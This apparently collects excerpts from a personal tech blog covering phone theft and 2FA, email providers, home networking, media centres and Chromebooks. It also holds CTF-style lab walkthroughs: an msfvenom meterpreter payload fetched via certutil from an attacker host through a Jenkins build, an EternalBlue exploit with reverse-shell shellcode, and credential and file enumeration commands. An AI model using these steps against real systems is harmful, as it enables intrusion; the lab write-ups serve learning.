The risk here is that someone with access to my SIM could call a pay-per-minute line, even a line the thief would have set-up himself. This could easily cause several hundreds or a few thousands Euro damage as we can learn from the first episode of Darknet Diaries. This meant I had to suspend my line right away to avoid additional costs! This also meant that with my line now suspended, I could no longer use feature to locate my phone and remotely erase it, such as Android Find and Find My Apple. My phone was locked with a 6 chars PIN, plus I suppose it was quickly turned off by the thief, considering how fast it went offline, and it requires a needle to remove the SIM. So, I decided my data inside was probably safe (I also had another trick in my sleeve, more on that later) and the real risk was to avoid extra cost and usurpation by someone having access to my phone line. I have a backup phone, but no extra SIM. It is an old phone and a “transitional” phone. I keep it when I have hardware issue / break current phone, etc. I just have to put the SIM card in it, and everything is set up. It already served its purpose a few times! So I tried to buy a new phone on Amazon (where I usually buy too many stuff). In order to confirm my order, I had to authenticate on my bank website and approve the payment. Which I did. Now my bank asked me to confirm the approbation I just gave via an - wait for it - text message ! Yup, I probably have hundreds of orders at amazon, with the same computer and IP, and they almost never asked me to confirm an order with my bank… and my bank never ask me to confirm “twice”… probably because I used to confirm orders (from other sites) with the phone app, and never did with the “regular” website from my computer… That’s a nice chicken / egg scenario where you have no phone, but require one to get one… Hopefully, the rest went fine !

Wherever I can, I use TOTP tokens as 2FA instead of text message. I have read horror stories about phone lines being “defaced”, and decided a long time ago that phone verification wasn’t a safe thing to do. Now, just doing that isn’t enough, because if you only have one authenticator app and if it is on your phone, then you are toasted! I use multiple instances of different authenticators. I have Authy on my phone AND on my desktop, and also Bitwarden self hosted. This means, that without my phone, I can continue to log in any 2FA websites. As I told you before, I was pretty confident my data was safe. I believe the thief went for the device and not the data itself, plus the phone was locked, etc. However, I still have sensitive data and access granted to all my accounts : mail, Nextcloud, VPN access, etc. I simply logged into all my accounts from my computer and revoked all accesses for the phone and then disconnected all sessions (this is where the authenticator was need to log back in from my main computer), and of course revoked my VPN access.

It is static, has no ads, no analytics. Just content! Unfortunately, I do not have the “before” screenshots, but I love the “after” ones : It was part automated and part manual work, but it was fun. I am very happy with the final result and proud to host this simple website! I hope you’ll like it as much as I do. Do not hesitate to contact me on Twitter if you have anything to ask regarding this new website.

Now, I tried to access this folder from my FTP client and couldn’t do it… I have been stuck here for HOURS! So I cheated, and checked official walk through. It turns out, I made a typo… and one can access the said folder and get some juicy files, especially PRTG Configuration.old.bak.

The password in the backup file ends in 2018, but unfortunately it doesn’t work. One can assume it is an old password, and the year has changed, so has the password. Hence, I tried to replace the year with 2019, 2020, 2021 and even 2022 (current year + 1)… Nothing worked… I was really feeling down and cheated, again. It happens that the second password I tested was the correct one! I tried it again, and this time, it worked and I was finally inside the admin panel!

This is a brute force attack! It happens, that we are lucky, some lazy admin used admin // admin as credentials! It was my first try, I didn’t even had to fire Burp Intruder, great! From here, I am thinking there may be a way to upload a malicious file from the admin panel, in order to gain access to the system (spoiler: nope). We also found one user and it’s password : maybe this is a system user (which I doubt).

This part shouldn’t be hard : I am thinking like downloading a malicious shell then running it via the build system. However, that alone, won’t help us much… it will make it easier to have a direct shell, but it won’t suffice to get full control. However, one easy solution would be to get a meterpreter shell and use msfconsole… Before going any further, I will run another build doing a dir \"C:\\\". I just want to check the system architecture (be sure check my cheatsheets if you are lost during a phase). It might prove useful later on, if I want to craft something with msfvenom. Since we know our arch is 64 bits, let’s craft our shell : msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=10443 -f exe \u003e shell.exe Now we run a basic HTTP server from our attacking machine to host the shell : sudo python2 -m SimpleHTTPServer 80 On our target machine, we edit the build script so that : it downloads our malicious file : certutil -urlcache -f http://$attacker_ip/shell.exe C:\\Users\\Bruce\\Desktop\\shell.exe it runs it : C:\\Users\\Bruce\\Desktop\\shell.exe Saving the changes, and back on our attacking machine, we run msfconsole and use exploit/multi/handler, set the correct options. In our case, we listen on port 10443. Back again on the Jenkins' machine, hit the build button, a meterprter shell as Bruce should now open : Thanks to power of metasploit, a simple getsystem will give us root: NB : this is where MetaSploit is clearly TOO powerful! I gained SYSTEM, using only one command… I have no idea what went on behind the scenes! I clearly need to look for a manual way to do that. But this will be for another time.

I usually check what files I have access to : find / -xdev -type f -user $current_user Let’s check who was access to sudo : ls -lhtrR /etc/sudo* I also like to check what users are on the system and see if I can access some files inside their home’s folders : cat /etc/passwd \u0026\u0026 ls -lhtrR /home/ And of course in our case, explore the web root folders.

This will be my first real tutorial, so I’ll try to explain the basics of what I am doing. Please bear in mind that I am very new to hacking, probably like you are. I am merely sharing my knowledge and by doing so I am making sure I understood what I did. Please correct me if you find anything wrong, or ask question if you need to! I’ll be happy to engage a discussion. NB : The following notes use $target_ip = IP of the target machine. This is more convenient when machine changes its IP. A note about “sudo”. I am a firm believer in the “least privileges” methodology, like never use your admin account on AD domain for day to day use, and never use sudo if you don’t need to. For example, search a package with “apt search X” and install it wish “sudo apt install X”. However, in case of Kali and nmap, I noticed that in quite often requires root depending of the flag you use. Since, I am no expert (yet), I will l run nmap (and many other Kali tools) with sudo! I do not log in as root, but as a regular user I created but I almost always use “sudo”. I will process simply by following the 5 stages of Ethical Hacking.

Searching on the internet, I came around this GitHub that seems to be able to do the job: https://github.com/helviojunior/MS17-010. According to the repo we need to install impacket and mysmb, I’ll let you do that, then we can use checker.py to see if we find any named pipe (since it is a safe way to exploit this) : cd into the clone repo then run : python2 checker.py $target_ip Unfortunately, we have no named pipes available… However, according to the repo : Eternalblue requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows \u003c 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits. Eternalchampion requires access to named pipe. The exploit has no chance to crash a target. Eternalromance requires access to named pipe. The exploit can target Windows \u003c 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit. Eternalsynergy requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file). Remember or recon phase and that Blue machine name? Looks like we are facing EternalBlue : we have seen that we have access to $IPC Share, Windows \u003c 8 (Windows 7 here), and port 445/tcp is open. In order to exploit this we need to use the following (still according to the repo) : eternalblue_exploit7.py \u003cip\u003e \u003cshellcode_file\u003e [numGroomConn] The repo tells us that there is 2 shellcode, one for each arch. However, we are not really sure which arch is our target. So we will assemble both shellcode : cd into the shellcode dir and : nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin Once this is done, we create our payloads like so : msfvenom -p windows/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -f raw -o sc_x86_msf.bin EXITFUNC=thread msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread Finally we “join” the two payloads together (with the provided python script from the repo) so that we can check both arch at the same time and hopefully get a shell : cat sc_x86_kernel.bin sc_x86_msf.bin \u003e sc_x86.bin cat sc_x64_kernel.bin sc_x64_msf.bin \u003e sc_x64.bin python2 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin Many thanks to this website for the info on how to assemble the shellcode. Now start a listener to receive the reverse shell on port 4444 (or the one you used with he msfvenom command): nc -lvp 4444 Let it open and finally, we run our command with the generated sc_all.bin as payload : python2 eternalblue_exploit7.py $target_ip ./shellcode/sc_all.bin Bingo, we have a shell as SYSTEM!

First and foremost, the non standard protocols! ProtonMail doesn’t use IMAP(s)/SMTP(s). This means I can’t easily configure it with classic mail clients, such as Thunderbird, or mutt, etc. Nor can I use it so send (alert) emails from my servers, for example. EDIT : Following this article, ProtonMail’s team contacted. I forgot to mention that there is a proprietary bridge so that you can use a “classic” client. However, once of my use case would be to send some email via CLI from my server. As far a I know, it won’t work for this use case since the CLI app requires a GUI to be installed. I knew it from the beginning and was okay with it. So, I had to use the proprietary applications. Webmail for the computer, and Android app on the phone. But here, came another issue. When I am on my computer (which is most of my awake time), I will only use the webmail. When I receive a new email, I mark it as read on the webmail. However the notification and the “email”, won’t clear from the phone until I open the app. As soon as I open the app, the mail disappears because it was already sorted from the webmail… Unfortunately, it also means that my phone had a constant blinking LED for this “already seen” email. This really really bugged me! Another small, but frustrating issue I had, was about 2FA. It will ask for your credentials + 2FA code EVERY time you close your browser tab/window (update the browse, reboot the computer, mistake, etc.), then you need to log in again with both regular credentials + 2FA code… This might be secure (“auth token” not being stored), but it is not convenient at all. I wish there could be an optional “Remember me for X days” mode. Last but not least, I love aliases and I use a lot of them for my emails. For example, my main email is denis@domain.com. For Amazon I will use denis+amazon@domain.com; for Wordpress, I will use denis+wordpress@domain.com and so on. Now this is not ProtonMail fault, but many websites won’t accept a “+” sign in the email address! Which is really stupid, by the way. The workaround, could be to be able to use a catch-all email address. It would allow me to use aliases like amazon@domain.com or wordpress@domain.com. This can be done with ProtonMail. However it comes with the most expensive version ($24 / month). NB :Maybe (to be verified) the Business version can do it as well ($6,25 / month).

Actually I couldn’t be happier since I left ProtonMail… However, one must not forget that ProtonMail targets “privacy” and “security” aware users. However, ProtonMail being not open source, it is kind of hard to evaluate how secure it is. I would tend to think that ProtonMail to ProtonMail messaging IS secure. However, ProtonMail to rest-of-the-world isn’t more secure than any regular email (due to the way “emails” work). EDIT : Another edit after talking to ProtonMail’s team. I was mistaken on that point.A ProtonMail user can send encrypted mail to a non ProtonMail user. However, I far as I understand it, this is not a “real” email. It only sends a “real” email with a link to the encrypted message that is then stored and opened on the ProtonMail’s server. We are, imho, outside of the scope of “just emails”. This is however a convenient feature and I should have mentioned. Now, still on the security side. FastMail can be used with PGP and it will make it pretty secure (and open source). Of course, I’d like to mention that I am using a custom domain for my emails. I have been doing so for many years. If I can give you only one piece of advice today, it will be to do the same. Having your own domain for email gives you so many freedom in the way you manage your emails. You can go to any provider, or even self host your email without ever having to “change” your email address(es). It is a really great peace of mind! Eventually if I can give you two pieces of advice. It will be (1) to use your own domain and (2)go with FastMail. NB : using the above link will give you 10% off and give me some extra credits as well.

First line, connects to the VMware server and will pompt for credentials. Then I declare an array or server, simply replace and add as many servers as you like. Simple foreach loop, goes through every server of the above defined array and does its job. Make sure to check official docs for more info about extra flags. NB : I use a relevant name, here “Before_Update” for my snapshots. It makes it easier to manage them since I know their name. Finally, we disconnect from the server.

Indeed, I used to work with network gear, mostly Ubiquiti and Ruckus… The thing is, the company I was working at was offering a service : basically WiFi hot spots, based on a custom coded application + a bunch of open source tools. However, on the hardware part, our client would follow (or not) our recommendations. It ended in some companies or individual using very cheap Ubiquiti gear on pretty harsh conditions (think outdoor and ports with huge boats). I was a system administrator, but also worked the helpdesk (small startup for the win!). I was pretty quickly discouraged by all the issues I had on those cheapo setup, and all the calls I received during summertime. Add to this a very weak broadband connection shared among all customers, and it was really a hell. Moreover, there was the horrible Java Unifi controller solution, years ago, before Docker was all the hype. I never liked to set it up, always afraid something weird will come up with Java. I have Java anxiety, but this is another story. On the other hand, we had Ruckus systems (indoors), without any issue, and also more Unifi APs (indoors) as well, that we never had any issue with!

We are very far away from cheap plastic equipment sounding (and feeling) hollow. Installing it was really easy. It is literally “plug and play”. I plugged the USG WAN to my ISP’s modem, and the USG LAN 1 to the Unifi switch, then all my devices to the switch, and the Unifi AP to the switch port n°8 (on my model, it is the only port that supports PoE).

You have a main “Dashboard” in which you see all your equipment along with pertinent information such as device name, IP, firmware version, etc. And also possible actions, like issue a reboot, update a firmware, etc. This is very convenient. From there, I “adopted” them one by one. It literally takes one click ! NB : Adopting a device is the Ubiquiti’s way to “unify” all your devices, so that they are linked to your controller and you can manage them. One the adoption was done, I could upgrade all my devices. Once again, it takes only one click (per device) ! Again, the web interface is really really nice, everything is very well integrated. You can see at a glance every devices connected to your network with a wire or via WiFi. I even discovered that my main computer was connected to both WiFi and ethernet… I probably forgot to disconnect WiFi after doing some tests a few days ago. If you have several access points or switches, then you’ll know every clients that are connected to them. This means that you can guess where your users are physically located. If for example, you have 2 APs, one called “garage”, located in the garage, and one called “kitchen”, located in the kitchen and you see that “Bobby’s Iphone” is connected to the Kitchen’s AP, then Bobby is probably in the kitchen.. or he forgot his phone inside the fridge (not so probable)… Another nifty feature is the “DPI” stats. It is pretty useless, but so cool that I couldn’t live without it now that I know it exists. Basically, it is a graphic summary of what every device “does” on the network, and shows percentage of every activity like streaming, game, web browsing, etc. I am not talking about the fact that, “it just works”.

For v3, this is another boring story… As I already said, I could have used and love a more “advanced mode” out of the box. The advanced configuration of the USG via config.gateway.json feels counter intuitive. I was also disappointed by the fact that the devices run VERY hot.

On the hardware side, I own a pretty decent setup : 1 x router with CPU that supports AES-NI on pfsense 1 x Meraki MR33 1 x Netgear switch (to be replaced with Meraki MS120) With my current setup I miss the integration of everything. I have to browse to one page for the router, another one for the switch and a third one for the AP. Hopefully, soon enough I will be able to manage the switch and the AP at the same place. But still, the router will be left alone. In the end, I have been very pleased with both Ubiquiti’s hardware and software.

The network thing is very important. Remember, when I told you that I do not want to expose too many ports. Creating separate networks allow me to do so. I have all my “web” apps, on the same network (br0, on this example). Which means, the reverse proxy can reach any other container by using its alias (even when containers’s IP change). This is kind of Docker’s internal DNS system. I see two main benefits by not exposing the ports when my “backend” containers and my reverse proxy containers are running both on the same host : I can use the same “internal” ports on all my backend containers (often 80 or 443); I only expose 80 and 443 from my remote server to the rest of the world!

It will allow Nvidia to target more users. For example, I have everything I need on the console / gaming side, and I am not interested in playing games on the Shield. Moreover, for occasional gaming, I can still pair my Xbox One (Bluetooth) controllers or any PS3 / PS4 controllers on the Shield. I bought this box to use purely as a 4K media center (I now have a 4K TV and the RPI3 doesn’t really handle 4K).

Back then, I was also bugged with the fact that Kodi (for example) will stop after a while and that some of the software I use could not notify it when new media were added to my libraries. I was probably dumb, or the option didn’t exists (which I doubt). If you want to have your Shield always “on” (like my good old RPI3), then you simply have enable Developer Settings and activate the always on feature. This way, as long as my Shield is plugged and Kodi is running it will stay up, allowing third party apps to update Kodi library as soon as new media are available. Another aspect of the Shield that appealed to me was the Plex Media Server part. I used to run a Docker container with Plex Media Center, how my computer wasn’t able to transcode 4K to something “smaller”. Now thanks to the Shield, my 4K media are transcoded correctly.

In order to write this article, I did try a few Android / Shield games, and I have to say that they are quite fine. They are a tons of them, and a lot are free (if you can endure the ads). This is definitely not a console I will play regularly or alone but if you have a few friends at home you’ll probably find a game or two to play. If you are into “bigger” games, like AAA, there are two possibilities : Geforce Now ; Game-Stream. I still think that Geforce Now is still not interesting. It requires a lot of bandwidth and recent titles are not available. Now there is the local streaming alternative. It is called Gefore Game-Stream and it allows you to stream games from your gaming computer (with an Nvidia graphic cards) to your Shield + TV. While I feel it works better than before : less latency, more games working “out of the box”, etc. I am still not into it. I think Windows doesn’t play well along it. This remains a regular PC, not a console and many actions have to be done with a keyboard / mouse. The Shield provide a pretty well done overlay so that you can “emulate” mouse / keyboard usage with the controller, but still… it is no fun to use. I really wish Windows would release some kind of real “game mode” / big picture interface. Then we would be talking! Last but not least, the retrogaming part. I am not changing my statement by an inch on this. Reetrogaming still suck on the Shield 2017. You’ll need good emulators and they are not free.

But what is Crouton? Crouton is a tool that will enable to create “chroot” installation a various Linux distribution. Basically, a “chroot” is a bit like a virtual machine, or box that sits inside your computer and allows you to run another (or several) “virtual” computer inside your physical one. In our case, it will allow us to install a “real” Linux inside the ChromeOS. Which means we will have a full standard working computer inside the limited ChromeOS computer. We will call this, our Kodi instance. Your computer should be “brand new”, with no data at all in it. Set ip up as usual with your Google account and Wi-Fi settings. Then, the fun starts. Open Chrome browser; Download the latest version of crouton, right here; Hit CTRL + ALT + T (it will open a new scary tab in Chrome), this is called a terminal emulator; Enter shell The “shell” appearance should slightly change; Enter the following command to create the “chroot”. sudo sh ~/Downloads/crouton -t kodi -n kodi NB : with -t being the “target” and -n the name of the instance. Wait for the process to complete, it will take a few minutes and text will scroll on your screen. Don’t close the tab, but you can keep you using your computer / navigating on other tabs. At some point, inside the tab we ran the previous command, it will ask you for a login and password. Enter anything you like, it doesn’t have to be your Google credentials. Actually, it is even better if you use any other credentials. You’ll then use them to log in Linux. The way it works, when you are prompted for your password, nothing will seem to happen. This is expected. Just enter you password once, hit Enter and confirm it. Wait for the process to finish.

The setup is straightforward: it will “only” ask you to give access to your Google account from the phone, and the same thing on your computer. So that both your devices all linked together thanks to this common account. On your computer, MightyText can be accessed from various ways : From a webpage : meaning it will run on any computer that can run a web browser ; There is also a desktop client for Macos and Windows, but not for Linux ; You can also use an extension for the Chrome browser, but not from Firefox. Now, in my opinion it is best to have the MightyText app always running on your desktop, so that you don’t miss any text / notification and can reply asap. Which means, depending on your OS and browser of choice, you might have limited options. Let’s say for example, you are running Linux and using Firefox, then your only choice will be to leave a Firefox tab always open… This might not be a problem for most people, but I personally hate to have too many tabs open… This, and only this, is a no go for me. As you might have noticed, I also talked about receiving notifications on your computer. Indeed, with this kind of apps, you can also do that. Again, it can be very useful if like me you are only using webmail and don’t want to leave an extra tab and/or app open in the background to receive new email notifications. Thanks to MightyText, you’ll receive a destop notification when you receive an email on your phone, then you just have to browse to your webmail, and take action. Supposedly, you are able to filter which apps from your phone are allowed to send notifications all the way up to your desktop. However I couldn’t find how to do that, and it means a lot of spam on my desktop. Especially when I was using Telegram on the desktop to chat, I was receiving notifications from both the Desktop client and the mobile client through the MightText app! Another no go… EDIT 22/09/2017: Thanks to their support on Twitter, this is how we filter apps notifications: Yes, you can customize this by visiting the MightyText web app – Phone tab – Apps section. Let us know if that works for you. This led me to check another well known player: Pushbullet.

In my opinion, this is much better than the other app mentioned before as it gives you a lot more possibilities. Like I said before, thanks to the browser extensions, you now have the app running and listening to incoming messages and notifications all the time your browser is open and without having to waste a tab. It is even foolproof, you won’t forget to open the tab! Here again, we can choose to filter notifications, and this time, I found it pretty straightforward to set it up. Which means no spamming on my desktop, and only receiving the desired notifications. I’ll get notifications for emails, appointments and of course text messages, which of course I can reply to with my keyboard.

If you want to create a new message, just select your contact’s name inside the browser extension (for example) to write your text. Send, it! Done. Then, 5% of the time… the message will stay “stuck” on your computer and won’t be relayed to you phone, hence they won’t be sent. At the time of writing, it only happened to me when I killed the app on phone (beware with the “kill all” function of Android phones). In those case, I just started the app again on the phone, and it fixed it. There could also be issues with battery management where the phone puts the app to sleep in order to reduce battery usage. If you have issues about not being able to send SMS after some time, then make sure that Android no longer optimize the battery for this app. Last but not least, all the messages sent / received from the computer will continue to appear in your default messages app, just like if you sent them from the phone.

Moreover, I feel it easier to navigate in the app, find what you are looking for, and tweak it (ie. the notification thingy). In a few words, we could say that Pushbullet is more basic, maybe even less “bloated”. Like I didn’t see any ads in Pushbullet, while I see some using MightyText webpage. Now, if you want to follow that road but feel to restricted by those 2 apps, you can also have a look a few other alternatives such as Join or Pulse. They look like pretty strong competitors as well.

Now, let’s me show you my twist. Let’s assume you have one (or several jails) for the software mentioned above. It is a pain in the *** so set up Freenas jail permissions correctly, but I’ll help. First of all, ssh to your Freenas server and enter the desired jail with the following commands: jls sudo jexec X where X is the jail’s number. From here, check the media user uid and gid by issuing: grep media /etc/passwd Now you should create a media group and user from the Freenas web admin (make sure the uid / gid of this user matches the one from the jail. It should be both 816 for gid and uid. See screenshot below: Now, back in the jail, we will replace the regular user of a said service with the media user. For example, if we want to make sure that couchpotato runs with the media user, we will do the following: service couchpotato onestop sysrc 'couchpotato_user=media' Then, we have to change ownership of all the files that belong to the previous coucpotato user to the new media one. In order to locate all those files, issue: find / -user couchpotato chown -R media:media /folder/name When you think, you are done, just do a last “find” like shown before to make sure there is nothing left. Then you can start the service again service couchpotato start Rinse and repeat for all the desired services / jail. NB : in case, the media user doesn’t exists in the jail, just create it. Last but not least, add storage to you jail. This storage must be the wanted folder for example that contains all your media and it must be owned by media:media with 775 permissions.

With the IP address from the logs, I can find who it belongs to, and where (at a city level, more or less) it is located. Every website owner has access to these information for their respective websites, and only their websites.

Moreover, while you can sometimes have 1 unique IP address with your ISP, a VPN will provide the same IP to many customers, making it even “less personal”. However, keep in mind that, even if the “end” website do not log you real IP, the VPN server will often do. At least, the VPN company knows what is your real IP and what is the one they provide you. Depending on their terms, and country law, they will have to log more or less information about you, and what you do. This is a very important point when trying to find a good VPN provide.

It could be to stay “under the radar” (just because you need it, or want it), it could to change your location, or even for your security (if you use open WiFi hotspot, then you absolutely want to use a VPN), and many others. However, if you do so, there be sure to try first and choose what seems adapted to your usage. For example, if I want a lot of privacy, I will use Tor service (which is not a “real” VPN). If I want a VPN that gives me plenty of location, and many different IPs / identities I would use something like IPVanish. If I want something more custom, then I will you my own VPN.

But what is Crouton? Crouton is a tool that will enable to create “chroot” installation a various Linux distribution. Basically, a “chroot” is a bit like a virtual machine, or box that sits inside your computer and allows you to run another (or several) “virtual” computer inside your physical one. In our case, it will allow us to install a “real” Linux inside the ChromeOS. Which means we will have a full standard working computer inside the limited ChromeOS computer. Your computer should be “brand new”, with no data at all in it. Set ip up as usual with your Google account and Wi-Fi settings. Then, the fun starts. Open Chrome browser; Download the latest version of crouton, right here; Hit CTRL + ALT + T (it will open a new scary tab in Chrome), this is called a terminal emulator; Enter shell The “shell” appearance should slightly change;Please note the “ -n kodi ” flag (see next step) which allows us to name our chroot “kodi”. If you already have followed our previous guide, then you replace kodi by another name since it has to be unique. You can choose anything you like, just avoid spaces in the name. Then, you’ll have to use that name you just set up everywhere in this guide instead of the default “kodi” name. Another solution, would be to delete the old kodi “chroot”. However, I would only do that if it doesn’t work at all. In order to do so, enter the following command: sudo delete-chroot kodi Ok, so you either deleted your old Kodi “chroot” or decided to rename the one we are about to create to something else. Enter the following command to create the “chroot”. sudo sh ~/Downloads/crouton -r sid -t xfce -n kodi Wait for the process to complete, it will take a few minutes and text will scroll on your screen. Don’t close the tab, but you can keep you using your computer / navigating on other tabs. At some point, inside the tab we ran the previous command, it will ask you for a login and password. Enter anything you like, it doesn’t have to be your Google credentials. Actually, it is even better if you use any other credentials. You’ll then use them to log in Linux. The way it works, when you are prompted for your password, nothing will seem to happen. This is expected. Just enter you password once, hit Enter and confirm it. Now, to run the Linux you just installed, you have to enter another command inside the “shell” tab. Hit: sudo enter-chroot -n kodi You are now inside the “chroot’. It is a bit like a virtual machine, or like you installed a brand new computer inside your Chrome OS device. Which means, you now have 2 devices in one : Chrome OS is there, always, unchanged. And an extra “Linux” system you can run when you want to. Let’s see how to install latest Kodi on Chrome OS, our last step.

And it’ll run the XFCE dsktop in the “chroot” we just installed. You can now run Kodi from the Menu inside the Multimedia category. I will say that is a pretty advanced tutorial, but if you have the “guts” to do it, then it’ll allow you to do huge things with a pretty cheap and decent piece of hardware that are Chrome OS. This tutorial applies to any Chrome OS laptop and the beauty of having Linux on your Chrome OS is that you can do anything. This is a regular Kodi, in a regular Linux, no limitation at all. I was afraid that Chrome OS would be pretty much locked down but actually once you activated that scary developer mode, you can do almost anything with ChromeOS, from installing Android apps, to Windows OS, and of course Linux. NB : you can switch from/to ChromeOS and from/to Linux by hitting CTRL + ALT + SHIFT + Forward (or Backward). Forward and Backward are the keys on the right of the Esc key.

More advanced, but one that will works everywhere, everytime. But also one that requires a bit more work and hardware. Let’s call it the expert’s way. For this method, you need to download any Linux Live CD. For example, go for Ubuntu as it is the most common one. Burn it to a DVD or make an USB bootable key. Boot the Live disk/key on the old computer. Once it has completely booted, you should be brought to a desktop, like the Windows desktop. Plug-in an external hard drive (the drive must have enough space to store the data you want to transfer). From here, there should be several icons on your desktop. We are particularly interested about 2 of them. The first one being the one for your WIndows disk and the second one being the one from the exterdan hard drive you have just plugged. Once, you figure out which is what. You just have to browse your old “Windows” disk and find the folder corresponding to your user. It should end like this: Users/YouUsername NB: make sure to change accordingly to your real username Once you have found this folder, right click on it and click Copy. Then, just like you would do with WIndows, browse to the external disk and right click on some blank space and click Paste. Once the copy is over. Shut off the computer, plug the bootable disk/key to the new computer. Proceed like before, but this time you’ll copy the data FROM the external disk TO the new Windows disk. Once copy is over, shutdown computer, unplug key/disks. Then you can normally turn on computer, and install missing apps with Ninite. Don’t worry about app configuration, it will come back the same way it was on the old computer as soon as you run them. That’s it, you can now easily transfer your files from Windows 10 computer without the without Easy Transfer tool.

I can see two big categories of game : small games: the ones you play inside your browser, on Facebook, etc. regular games : the ones you play on a console, or the one you have to install on your computer and require dedicated hardware such as a good video card. Now when we talk about video game streaming, we are talking about the second category, aka regular games. Streaming a video game means playing a game on your computer without having to install it and without having to use dedicated hardware. Usually (without streaming), it is your computer that do all the work and “maths” so that you can play the game. This are really heavy operations, hence the requirements of dedicated hardware and “gaming pc”.

In order to be able to stream a game, you’ll need a very good bandwidth on your internet connection. Gaming is “live”, it is not like a movie you can pause a few seconds until it buffers and start playing again. Moreover, video game streaming uses more bandwidth for the same quality than a movie. This is simply true because a movie runs at 24 frame per second (FPS), while a game runs at 60 frame per second (FPS). Which means you’ll need to download almost 3 times more data for a game than a movie.

If you are using some kind of software to keep your movies and TV show database up-to-date, it will have to notify your Kodi media center, as soon as a new item is available. However, as long as your TV is not running, it can’t be accessed by any software. Which means, it will not update your libraries automatically. You’ll have to manually update it each and every time you start Kodi. Stability. It is not stable at all! Let’s say you watch a movies on Kodi every evening, then you’ll probably have to restart the Kodi application every night before using it. I have noticed that every time I let Kodi run “in the background’ for a few hours (because I don’t use my TV, or play console on some other input) and start it again it is unresponsive. Add to this, the fact that sometimes some Android services just crashes during a video, which means you’ll get a notification pop-up in the middle of your movie, and you must close it manually to get rid of it.

Nvidia Geforce Now, for about ten bucks a month, you can rent games and play them on your shield without having to use a computer.

However, you’ll need the very HIGH bandwith (we are talking about 50Mbit/s for 1080p @ 60Hz as per official requirements) in order to be able to play any game. Moreover, most recent games can’t really be rented but have to be completely bought.. and you’ll sometimes get a key for your regular PC but not always. If you have a gaming computer, it is still better to buy the regular game and stream it thanks to Geforce Game-Stream. Last but not least, playing old console games.

However, playing old games on a regular PC is very often a lot of trouble: one must configure its controller for every emulator, tweak video and audio settings, etc. This is really a LOT of time wasted before begin able to play. This is where XBMC is great. Since it has standardized hardware from audio, video chips to controller, it means that everyone using an Xbox uses the exact same setup (which will never be the case on a regular PC). In practical terms, it means that once the emulators are installed and the roms downloaded : everything is plug and play! No tweaking settings, no controller mappings, etc. This was 13 years ago. Today, one can still play emulators on Kodi, however, since Kodi runs on a regular PC it is a lot more trouble… Unless we chose the road, once again to standardized hardware with Android device such as Nvidia Shield TV, or Raspberry Pis units.

In order to understand 4K resolution, we have to understand what resolution is. According to Wikipedia, display resolution is “is the number of distinct pixels in each dimension that can be displayed”. A very common resolution nowadays is Full HD (also referred as 1080p). It means that an image using this resolution is 1920 pixels in width by 1080 pixels in height. Now, the latest 4K resolution, is 4 times this size, which is 3840 pixels in width by 2160 pixels in height. Let’s do some simple maths : FHD –\u003e 1920*1080 = 2,073,600 4K –\u003e 3840*2160 = 8,294,400 then 4K / FHD —\u003e 8,294,400 / 2,073,600 = 4 Basically, it means it 4K times “superior” to Full HD resolution.

Well, actually… sorry for the answer but it’ll be a yes and a no at the same time. Yes, Kodi is 4K ready (as long as your hardware is, more on that coming in a dedicated post). Skins will “auto resize” to the 4K resolution from 1080p which is as easy as doubling height and width (which in the end results in a 4 times factor) of every images from the skins. Moreover, Kodi will upscale lower resolution’s content to 4K, and with the proper settings (more on that coming in another post as well) you could, subjectively again, notice a better overall quality from your content. And no, Kodi is not 4K ready. Indeed, the skins are “just” 1080p yet, and are not natively drawn with the 4K resolution (whereas PS4 and Xbox One skins are). In practice, it works really fine. In theory, it shows a lack of interest for the format. Last but not least, 4K content is awfully missing (not Kodi’s fault here), and in order to really enjoy Kodi in 4K, we really need quality 4K content. Now that we have shown you a brief tour of 4K, it’s up to you to decide whether or not you want to go down that road.

Kodi, thanks to some nifty plugins can allow you to stream movies and TV shows, just like Popcorn time. There is however one big difference. Kodi streams its data directly from “established” websites, this is what we call “direct download” or direct streaming. When you watch a movies, only you, the website owner and your ISP know what you are doing. If streaming such data is illegal in your country, then you want the least people to know what you are doing. Popcorn time on the other hand, is a P2P system based on torrent’s files. It means the data you are streaming is shared by many people (can be up to several hundreds people, even more technically). In the end, you, your ISP, and everyone “sharing” the file know what you are doing. Among those people, some will be because they want to watch it like, some others just want to help and keep “offering” movies to everyone, and some others might be here only to “spy on you”. To sum this up, Popcorn Time is not the safe to stream movies, and I’d avoid using it. Also please remember that streaming movies you don’t own the rights for is probably illegal wherever you live.

While playing any item and in addition to classic play/pause/forward/rewind/stop, you can manage subtitles (download, turn on/off, sync), modify audio (source, volume), and much more.

It is a two step process: Download latest version of Pseudo TV by clicking here, and save it to the computer running Kodi / XBMC; Run Kodi / XBMC, and navigate to Settings \u003e Add-ons, then select Install from zip and choose the file you downloaded at Step 1.

Hover Pseudo TV addons, and hit your keybaord key “c”, in order to configure the plugin. From here choose Open Channel Configuration, scroll down the channel list until you see an empty one. From here, configure your channel according to your needs, ie: I am using TV Show as Channel Class, then I selected “The Simpsons” as the wanted TV Show. Save, validate and run the program by navigating back to Programs and hitting “Return/Enter” keyboard on the PseudoTV name entry. That’s it you are done!
